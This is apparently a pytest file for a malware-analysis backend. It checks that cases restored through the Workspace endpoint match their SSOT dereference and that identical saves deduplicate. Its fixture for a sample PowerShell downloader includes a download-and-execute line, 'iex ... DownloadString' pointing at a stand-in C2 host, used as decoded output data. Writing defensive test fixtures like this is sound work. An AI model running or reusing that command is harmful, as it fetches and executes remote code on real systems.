"""R28.2 · Restore Equivalence — in-process (Workspace ↔ SSOT dereference).

The Workspace path is fully sync (PyMongo) so it works cleanly under
TestClient.  The History path requires Motor async binding which is
fragile under TestClient — that path is covered by the LIVE
equivalence suite (``test_restore_equivalence_live.py``) which hits
the real backend through Kubernetes ingress.

Contract enforced here
──────────────────────
  Workspace  · GET /api/cases/{id}     ┐
  SSOT deref · GET /api/ssot/{inv_id}  ┴─► identical: checksum,
                                          verdict, IOCs, version,
                                          artifact_trace

Run:  cd /app/backend && python -m pytest tests/test_restore_equivalence.py -v
"""
from __future__ import annotations

import hashlib
import json
import os
import sys
import uuid
from typing import Any, Dict

from fastapi.testclient import TestClient

sys.path.insert(0, "/app/backend")
os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from server import app  # noqa: E402
from deps import get_current_user  # noqa: E402


_TEST_EMAIL = "restore-equivalence@nivxray.local"


def _fake_user() -> Dict[str, Any]:
    return {"email": _TEST_EMAIL, "sub": _TEST_EMAIL}


app.dependency_overrides[get_current_user] = _fake_user
client = TestClient(app)


def _sample_ssot() -> Dict[str, Any]:
    return {
        "understanding": {"input_kind": "powershell", "confidence": 0.94},
        "analyst_narrative": {"executive_summary": "PS downloader"},
        "inline_story_preproc": {"stages": [{"op": "b64"}, {"op": "gzip"}]},
        "investigation_object": {"incident": {"behaviors": ["T1059.001"]}},
        "investigation_mode": True,
        "verdict_card": {"verdict": "Malicious", "confidence": 92,
                         "family": "Cobalt Strike"},
        "decode_trace": [
            {"op": "b64",  "out_len": 512,  "reason": "b64 alphabet"},
            {"op": "gzip", "out_len": 2048, "reason": "1F 8B magic"},
        ],
        "iedde": {"steps": [{"decision": "recover"}]},
        "canonical_confidence": 0.93,
        "canonical_confidence_reason": "3-layer clean recovery",
        "mitre": ["T1059.001", "T1105"],
        "lolbas": ["powershell.exe"],
        "semantic": {"clusters": ["c2-download"]},
        "reached_shellcode": True,
        "chain": [{"op": "b64"}, {"op": "gzip"}],
        "steps": [{"op": "b64", "args": {}}, {"op": "gzip", "args": {}}],
        "analysis": {"iocs": {"ipv4": ["1.2.3.4"],
                              "url":  ["http://c2.example/beacon"]},
                     "mitre": ["T1059.001"],
                     "ai_verdict": "Malicious"},
    }


def _fingerprint(ssot: Dict[str, Any]) -> str:
    strip = {"persisted_at", "last_seen_at", "ref_count", "ssot_source",
             "investigation_id", "checksum"}
    scrubbed = {k: v for k, v in ssot.items() if k not in strip}
    return hashlib.sha256(
        json.dumps(scrubbed, sort_keys=True, default=str,
                   ensure_ascii=False, separators=(",", ":")).encode("utf-8"),
    ).hexdigest()


def _iocs(ssot: Dict[str, Any]) -> Dict[str, Any]:
    return (ssot.get("analysis") or {}).get("iocs") or {}


def _verdict(ssot: Dict[str, Any]) -> Dict[str, Any]:
    return ssot.get("verdict_card") or {}


def _save_case_with_ssot(name: str, input_text: str,
                         ssot: Dict[str, Any]) -> Dict[str, Any]:
    r = client.post(
        "/api/cases/save",
        json={
            "name": name,
            "input": input_text,
            "output": "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
            "engine": "powershell-recursive",
            "confidence": 92,
            "chain_ids": ["b64", "gzip"],
            "verdict": "Malicious",
            "iocs": {"ipv4": ["1.2.3.4"]},
            "ssot": ssot,
        },
    )
    assert r.status_code == 200, r.text
    return r.json()


# ═════════════════════════════════════════════════════════════════════════
# Workspace ↔ SSOT dereference — sync path, TestClient-safe.
# ═════════════════════════════════════════════════════════════════════════
def test_workspace_case_matches_ssot_dereference():
    ssot = _sample_ssot()
    name = f"restore-eq-case-{uuid.uuid4().hex[:6]}"
    save = _save_case_with_ssot(name, "powershell -EncodedCommand ABC==", ssot)
    case_id = save["id"]

    ws = client.get(f"/api/cases/{case_id}").json()
    ws_ssot = ws["ssot"]
    ws_ref  = ws.get("ssot_ref") or {}
    assert ws_ref.get("id"), "workspace restore must expose ssot_ref"

    deref = client.get(f"/api/ssot/{ws_ref['id']}").json()
    deref_ssot = deref["ssot"]

    assert _fingerprint(ws_ssot) == _fingerprint(deref_ssot)
    assert ws_ref["checksum"] == deref["checksum"]
    assert _verdict(ws_ssot) == _verdict(deref_ssot)
    assert _iocs(ws_ssot) == _iocs(deref_ssot)
    assert ws_ssot["version"] == deref["version"]
    assert ws.get("artifact_trace") == deref["artifact_trace"]


def test_two_identical_saves_dedupe_to_one_investigation():
    """Content-addressable dedupe holds for the Workspace path."""
    ssot = _sample_ssot()
    input_text = f"psl-workspace-dedupe-{uuid.uuid4().hex[:6]}"
    a = _save_case_with_ssot(f"eq-a-{uuid.uuid4().hex[:6]}", input_text, ssot)
    b = _save_case_with_ssot(f"eq-b-{uuid.uuid4().hex[:6]}", input_text, ssot)
    ca = client.get(f"/api/cases/{a['id']}").json()
    cb = client.get(f"/api/cases/{b['id']}").json()
    ra = ca.get("ssot_ref") or {}
    rb = cb.get("ssot_ref") or {}
    assert ra["checksum"] == rb["checksum"]
    assert ra["id"] == rb["id"]
